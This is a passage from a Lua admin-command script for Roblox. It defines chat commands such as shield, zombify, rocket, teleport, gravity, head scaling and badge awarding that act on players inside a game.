local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.Workspace:GetChildren()
for i2 =1,#c do
if string.sub(c[i2].Name,1,4) == "Jail" then
if string.sub(c[i2].Name,5) == player[i].Name then
c[i2]:remove()
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("givebtools", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
local a = Instance.new("HopperBin")
a.BinType = "GameTool"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Clone"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Hammer"
a.Parent = player[i].Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unshield", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local shield = player[i].Character:FindFirstChild("Weird Ball Thingy")
if shield ~= nil then
shield:remove()
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("shield", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
if player[i].Character:FindFirstChild("Weird Ball Thingy") == nil then
local ball = Instance.new("Part")
ball.Size = Vector3.new(10,10,10)
ball.BrickColor = BrickColor.new(1)
ball.Transparency = 0.5
ball.CFrame = torso.CFrame
ball.TopSurface = "Smooth"
ball.BottomSurface = "Smooth"
ball.CanCollide = false
ball.Name = "Weird Ball Thingy"
ball.Reflectance = 0.2
local sm = Instance.new("SpecialMesh")
sm.MeshType = "Sphere"
sm.Parent = ball
ball.Parent = player[i].Character
createscript([[ 
function ot(hit) 
if hit.Parent ~= nil then 
if hit.Parent ~= script.Parent.Parent then 
if hit.Anchored == false then
hit:BreakJoints()
local pos = script.Parent.CFrame * (Vector3.new(0, 1.4, 0) * script.Parent.Size)
hit.Velocity = ((hit.Position - pos).unit + Vector3.new(0, 0.5, 0)) * 150 + hit.Velocity	
hit.RotVelocity = hit.RotVelocity + Vector3.new(hit.Position.z - pos.z, 0, pos.x - hit.Position.x).unit * 40
end end end end
script.Parent.Touched:connect(ot) ]], ball)
local bf = Instance.new("BodyForce")
bf.force = Vector3.new(0,5e+004,0)
bf.Parent = ball
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = ball
ball.Shape = 0
w.Parent = torso
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("time", 5, function(msg, MessageSplit, speaker, Self)
game.Lighting.TimeOfDay = string.sub(msg,6)
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("maxplayers", 5, function(msg, MessageSplit, speaker, Self)
local pie = game.Players.MaxPlayers
game.Players.MaxPlayers = string.sub(msg,12)
if game.Players.MaxPlayers == 0 then
game.Players.MaxPlayers = pie
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("zombify", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local arm = player[i].Character:FindFirstChild("Left Arm")
if arm ~= nil then
arm:remove()
end
local arm = player[i].Character:FindFirstChild("Right Arm")
if arm ~= nil then
arm:remove()
end
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
local zarm = Instance.new("Part")
zarm.Color = Color3.new(0.631373, 0.768627, 0.545098)
zarm.Locked = true
zarm.formFactor = "Symmetric"
zarm.Size = Vector3.new(2,1,1)
zarm.TopSurface = "Smooth"
zarm.BottomSurface = "Smooth"
createscript( [[
wait(1)
function onTouched(part)
if part.Parent ~= nil then
local h = part.Parent:findFirstChild("Humanoid")
if h~=nil then
if cantouch~=0 then
if h.Parent~=script.Parent.Parent then
if h.Parent:findFirstChild("zarm")~=nil then return end
cantouch=0
local larm=h.Parent:findFirstChild("Left Arm")
local rarm=h.Parent:findFirstChild("Right Arm")
if larm~=nil then
larm:remove()
end
if rarm~=nil then
rarm:remove()
end
local zee=script.Parent.Parent:findFirstChild("zarm")
if zee~=nil then
local zlarm=zee:clone()
local zrarm=zee:clone()
if zlarm~=nil then
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
zlarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zrarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zlarm.Parent=h.Parent
zrarm.Parent=h.Parent
zlarm:makeJoints()
zrarm:makeJoints()
zlarm.Anchored=false
zrarm.Anchored=false
wait(0.1)
h.Parent.Head.Color=zee.Color
else return end
end
wait(1)
cantouch=1
end
end
end
end
end
script.Parent.Touched:connect(onTouched)
]],zarm)
zarm.Name = "zarm"
local zarm2 = zarm:clone()
zarm2.CFrame = torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zarm.CFrame = torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zarm.Parent = player[i].Character
zarm:MakeJoints()
zarm2.Parent = player[i].Character
zarm2:MakeJoints()
local head = player[i].Character:FindFirstChild("Head")
if head ~= nil then
head.Color = Color3.new(0.631373, 0.768627, 0.545098)
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("explode", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local ex = Instance.new("Explosion")
ex.Position = torso.Position
ex.Parent = game.Workspace
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rocket", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local r = Instance.new("Part")
r.Name = "Rocket"
r.Size = Vector3.new(1,8,1)
r.TopSurface = "Smooth"
r.BottomSurface = "Smooth"
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = r
w.C0 = CFrame.new(0,0,-1)
local bt = Instance.new("BodyThrust")
bt.force = Vector3.new(0,5700,0)
bt.Parent = r
r.Parent = player[i].Character
w.Parent = torso
createscript([[
for i=1,120 do
local ex = Instance.new("Explosion")
ex.BlastRadius = 0
ex.Position = script.Parent.Position - Vector3.new(0,2,0)
ex.Parent = game.Workspace
wait(0.05)
end 
local ex = Instance.new("Explosion")
ex.BlastRadius = 10
ex.Position = script.Parent.Position
ex.Parent = game.Workspace
script.Parent.BodyThrust:remove()
script.Parent.Parent.Humanoid.Health = 0
]],r)
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ambient", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 9,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
game.Lighting.Ambient = Color3.new(-string.sub(msg,9,danumber1 - 1),-string.sub(msg,danumber1 + 1,danumber2 - 1),-string.sub(msg,danumber2 + 1))
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("part", 5, function(msg, MessageSplit, speaker, Self)
local danumber1 = nil
local danumber2 = nil
for i = 6,100 do
if string.sub(msg,i,i) == ""..key then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == ""..key then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end 
end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,6,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Part"
part.Parent = game.Workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("control", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
if #player > 1 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
speaker.Character = player[i].Character
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("trip", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
torso.CFrame = CFrame.new(torso.Position.x,torso.Position.y,torso.Position.z,0, 0, 1, 0, -1, 0, 1, 0, 0)--math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random()) -- i like the people being upside down better.
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("setgrav", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i =9,100 do
if string.sub(msg,i,i) == ""..key then
danumber = i
break
end 
end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,9,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * -string.sub(msg,danumber + 1),0)
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("walkspeed", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i =11,100 do
if string.sub(msg,i,i) == ""..key then
danumber = i
break
end 
end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,11,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = string.sub(msg,danumber + 1)
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("damage", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == ""..key then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.Health = humanoid.Health -  string.sub(msg,danumber + 1)
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("health", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == ""..key then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
local elnumba = Instance.new("IntValue") 
elnumba.Value = string.sub(msg,danumber + 1)
if elnumba.Value > 0 then
humanoid.MaxHealth = elnumba.Value
humanoid.Health = humanoid.MaxHealth
end 
elnumba:remove()
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("teleport", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i = 10,100 do
if string.sub(msg,i,i) == " " then
danumber = i
break
end 
end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,10,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
torso = nil
for i =1,#player2 do
if player2[i].Character ~= nil then
torso = player2[i].Character:FindFirstChild("Torso")
end 
end
if torso ~= nil then
for i =1,#player1 do
if player1[i].Character ~= nil then
local torso2 = player1[i].Character:FindFirstChild("Torso")
if torso2 ~= nil then
torso2.CFrame = torso.CFrame
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("merge", 5, function(msg, MessageSplit, speaker, Self)
danumber = nil
for i =7,100 do
if string.sub(msg,i,i) == ""..key then
danumber = i
break
end end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,7,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
for i =1,#player2 do
if player2[i].Character ~= nil then
player2 = player2[i].Character
end 
end
for i =1,#player1 do
player1[i].Character = player2
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("clearscripts", 5, function(msg, MessageSplit, speaker, Self)
local c = game.Workspace:GetChildren()
for i =1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Is A Created Script") then
c[i]:remove()
end 
end 
end 
local d = game.Players:GetPlayers() 
for i2 = 1,#d do
for i,v in pairs(d[i2]:GetChildren()) do
if v:isA("Script") and v:FindFirstChild("Is A Created Script") then
v:remove()
end 
end 
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("respawn", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
local ack2 = Instance.new("Model")
ack2.Parent = game.Workspace
local ack4 = Instance.new("Part")
ack4.Transparency = 1
ack4.CanCollide = false
ack4.Anchored = true
ack4.Name = "Torso"
ack4.Position = Vector3.new(10000,10000,10000)
ack4.Parent = ack2
local ack3 = Instance.new("Humanoid")
ack3.Torso = ack4
ack3.Parent = ack2
player[i].Character = ack2
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("invisible", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,11),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 1 
end end
if c[i].className == "Part" then
c[i].Transparency = 1
if c[i].Name == "Torso" then
local tshirt = c[i]:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = char
tshirt:remove()
end end
if c[i].Name == "Head" then
local face = c[i]:FindFirstChild("face")
if face ~= nil then
gface = face:clone()
face:remove()
end end end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("visible", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 0
end end
if c[i].className == "Part" then
c[i].Transparency = 0
if c[i].Name == "Torso" then
local tshirt = char:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = c[i]
tshirt:remove()
end end
if c[i].Name == "Head" then
if gface ~= nil then
local face = gface:clone()
face.Parent = c[i]
end end end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("freeze", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 0
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = true
end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("thaw", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 16
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = false
c[i].Reflectance = 0
end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nograv", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 196.2,0)
end end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("antigrav", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 140,0)
end end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("highgrav", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force - Vector3.new(0,c2[i]:getMass() * 80,0)
end end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("grav", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf:remove()
end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unlock", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = false
end end end end end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("lock", 5, function(msg, MessageSplit, speaker, Self)
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = true
end 
end 
end 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("time", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 6 then
game.Lighting.TimeOfDay = string.sub(msg,6)
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("resetmp", 5, function(msg, MessageSplit, speaker, Self)
game.Players.MaxPlayers = MaxPlayers
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("color", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 7 then
Add = nil
for i=7,10000 do
if string.sub(msg,i,i) == "/" then
Add = i
break
elseif string.sub(msg,i,i) == "" then
break
end
end
if Add then
Plr = findplr(string.sub(msg,7,Add-1),player)
if Plr ~= 0 then
for _,v in pairs(Plr) do
for _,c in pairs(v.Character:GetChildren()) do
if c.className == "Part" then
c.BrickColor = BrickColor.new(string.sub(msg,Add+1))
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rcolor", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 8 then
Plr = findplr(string.sub(msg,8),player)
if Plr ~= 0 then
for _,v in pairs(Plr) do
for _,c in pairs(v.Character:GetChildren()) do
if c.className == "Part" then
c.BrickColor = BrickColor.random()
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("launch", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 8 then
plr = findplr(string.sub(msg,8),player)
if plr ~= 0 then
for _,v in pairs(plr) do
Rocket = Instance.new("Part")
Rocket.Name = "BCGRocket"
Rocket.Size = Vector3.new(1,8,1)
Rocket.TopSurface = "Smooth"
Rocket.BottomSurface = "Smooth"
Weld = Instance.new("Weld")
Weld.Part1 = v.Character.Torso
Weld.Part0 = Rocket
Weld.C0 = CFrame.new(0,0,-1)
Body = Instance.new("BodyThrust")
Body.force = Vector3.new(0,5700,0)
Body.Parent = Rocket
Rocket.Parent = v.Character
Weld.Parent = v.Character.Torso
scriptz([[
for i=1,120 do
local BOOM = Instance.new("Explosion")
BOOM.BlastRadius = 0
BOOM.Position = script.Parent.Position - Vector3.new(0,2,0)
BOOM.Parent = game.Workspace
wait(0.05)
end 
local BOOM2 = Instance.new("Explosion")
BOOM2.BlastRadius = 10
BOOM2.Position = script.Parent.Position
BOOM2.Parent = game.Workspace
script.Parent.BodyThrust:remove()
script.Parent.Parent.Humanoid.Health = 0
]],v,Rocket)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("flip", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 6 then
plr = findplr(string.sub(msg,6),player)
if plr ~= 0 then
for _,v in pairs(plr) do
torso = v.Character.Torso
torso.CFrame = CFrame.new(torso.Position.x,torso.Position.y,torso.Position.z,0, 0, 1, 0, -1, 0, 1, 0, 0)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bighead", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 9 then
stop = findplr(string.sub(msg,9),player)
if stop ~= 0 then
for _,v in pairs(stop) do
v.Character.Head.Mesh.Scale = Vector3.new(5,5,5)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("smallhead", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 11 then
stop = findplr(string.sub(msg,11),player)
if stop ~= 0 then
for _,v in pairs(stop) do
v.Character.Head.Mesh.Scale = Vector3.new(0.625,0.625,0.625)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("normhead", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 10 then
stop = findplr(string.sub(msg,10),player)
if stop ~= 0 then
for _,v in pairs(stop) do
v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25)
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sethead", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 9 then
Add = nil
Num = nil
for i=9,1000 do
if string.sub(msg,i,i) == "/" then
Add = i
break
elseif string.sub(msg,i,i) == "" then
break
end
end
if Add then
stop = findplr(string.sub(msg,9,Add-1),player)
if stop ~= 0 then
Num = tonumber(string.sub(msg,Add+1))
if Num then
for _,v in pairs(stop) do
v.Character.Head.Mesh.Scale = Vector3.new(Num,Num,Num)
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("hide", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 6 then
stop = findplr(string.sub(msg,6))
if stop ~= 0 then
for _,v in pairs(stop) do
A = v.Character.Head:clone()
A.face:remove()
B = Instance.new("Weld",v.Character.Head)
B.Name = "BCGWeld"
B.Part1 = v.Character.Head
B.Part0 = A
v.Character.Head.Transparency = 1
A.Name = "PseudoHead"
A.Parent = v.Character
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unhide", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 8 then
stop = findplr(string.sub(msg,8))
if stop ~= 0 then
for _,v in pairs(stop) do
if v.Character:FindFirstChild("PseudoHead") then
v.Character.PseudoHead:remove()
v.Character.Head.Transparency = 0
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("unsmoke", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=9 then
stop = findplr(string.sub(msg,9),player)
if stop ~= 0 then
for x=1,#stop do
Spark = stop[x].Character.Torso:FindFirstChild("BCGSmoke")
if Spark then
Spark:remove()
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("smoke", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
stop = findplr(string.sub(msg,7),player)
if stop ~= 0 then
for x=1,#stop do
Spark = stop[x].Character.Torso:FindFirstChild("BCGSmoke")
if not Spark then
A=Instance.new("Smoke")
A.Name = "BCGSmoke"
A.Color = Color3.new((math.random(1,255))/255,(math.random(1,255))/255,(math.random(1,255))/255)
A.Opacity = 0.5
A.RiseVelocity = 5
A.Parent = stop[x].Character.Torso
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("shadcol", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 9 then
I = nil
C = nil
for i=9,1000 do
if string.sub(msg,i,i) == "/" then
I = i
break
end
end
if I then
for c=I+1,10000 do
if string.sub(msg,c,c) == "/" then
C = c
break
end
end
if C then
game.Lighting.ShadowColor = Color3.new(tonumber(string.sub(msg,5,I-1)),tonumber(string.sub(msg,I+1,C-1)),tonumber(string.sub(msg,C+1)))
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("b", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 3 then
I = nil
for i=3,9999 do
if string.sub(msg,i,i) == "/" then
I = i
break
end
end
if I then
stop = findplr(string.sub(msg,3,I-1),player)
if stop ~= 0 then
ID = tonumber(string.sub(msg,I+1))
if ID then
for _,v in pairs(stop) do
game:GetService("BadgeService"):AwardBadge(v.userId,ID)
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("amb", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 5 then
I = nil
C = nil
for i=5,1000 do
if string.sub(msg,i,i) == "/" then
I = i
break
end
end
if I then
for c=I+1,10000 do
if string.sub(msg,c,c) == "/" then
C = c
break
end
end
if C then
game.Lighting.Ambient = Color3.new(tonumber(string.sub(msg,5,I-1)),tonumber(string.sub(msg,I+1,C-1)),tonumber(string.sub(msg,C+1)))
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("brightness", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 12 then
print(string.sub(msg,12))
game.Lighting.Brightness = tonumber(string.sub(msg,12))
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gettool", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg) >= 9 then
Plr = nil
Tool = nil
for i=9,1000 do
if string.sub(msg,i,i) == "/" then
Plr = i
break
elseif string.sub(msg,i,i) == "" then
break
end
end
if Plr then
stop = findplr(string.sub(msg,9,Plr-1),player)
if stop ~= 0 then
Toolz = findtool(string.sub(msg,Plr+1))
if Toolz then
for _,v in pairs(stop) do
for _,c in pairs(Toolz) do
c:clone().Parent = v.Backpack
end
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("give", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=6 then
AAA = nil
for sa=6,1000 do
if string.sub(msg,sa,sa) == "/" then
AAA = sa
break
elseif string.sub(msg,sa,sa) == "" then
break
end
end
stop = findplr(string.sub(msg,6,AAA-1),player)
if stop ~= 0 then
for _,f in pairs(stop) do
ID = string.sub(msg,AAA+1)
Insert = game:GetService("InsertService"):LoadAsset(ID)
Child = Insert:GetChildren()
Check = false
for i=1,#Child do
if (Child[i].className == "Hat" or Child[i].className == "CharacterMesh" or Child[i].className == "Shirt" or Child[i].className == "Pants") then
Child[i].Parent = f.Character
end
end
Insert:remove()
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ice", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=5 then
stop = findplr(string.sub(msg,5),player)
if stop ~= 0 then
for x=1,#stop do
Char = stop[x].Character:GetChildren()
for i=1,#Char do
if Char[i].className == "Part" then
Char[i].Material = "Ice"
end
end
end
end
end
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("grass", 5, function(msg, MessageSplit, speaker, Self)
if string.len(msg)>=7 then
stop = findplr(string.sub(msg,7),player)
if stop ~= 0 then
